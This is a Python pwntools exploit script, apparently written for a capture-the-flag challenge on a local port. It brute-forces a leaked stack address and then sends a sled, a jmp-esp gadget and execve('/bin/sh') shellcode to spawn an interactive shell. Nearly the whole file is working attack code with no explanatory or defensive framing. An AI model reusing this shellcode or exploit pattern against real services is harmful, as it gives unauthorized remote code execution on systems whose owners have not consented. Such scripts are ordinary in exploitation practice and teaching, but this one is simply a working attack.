#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

# imports

from pwn import *
import time

context.log_level = "debug"

#consider if no aslr.
stack_start = 0xfffdd000
stack_end = 0xffffe000

def fck_round():

    p = remote("0",9019)

    time.sleep(0.3)
    p.recv()
    time.sleep(2.5)
    p.recv()
    time.sleep(2.5)
    p.recv()
    time.sleep(2.5)
    p.recv()
    time.sleep(2.5)
    p.recvuntil("exit\n")

    nop = p32(0x08048c6f)
    jmp_esp = p32(0x0804903b)

    shell_code = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"


    payload = nop * 1000 + jmp_esp + shell_code

    for i in range(256):

        try:
            p.sendline("1")
            time.sleep(0.1)
            data = p.recvuntil("exit\n")
            addr = data.split("[")[1].split("]")[0]
            if int(addr,16) >= stack_start and addr <= stack_end:
                print "addr: 0x" + addr
                p.sendline("2")
                p.recvuntil("no?\n")
                p.sendline(str(i))
                p.recvuntil(")\n")
                p.sendline(payload)
                time.sleep(2)
                data = p.recv()
                p.interactive()
                if "create" in data:
                    continue
                else:
                    p.interactive()
            else:
                continue
        except:
            return
while 1:
    fck_round()





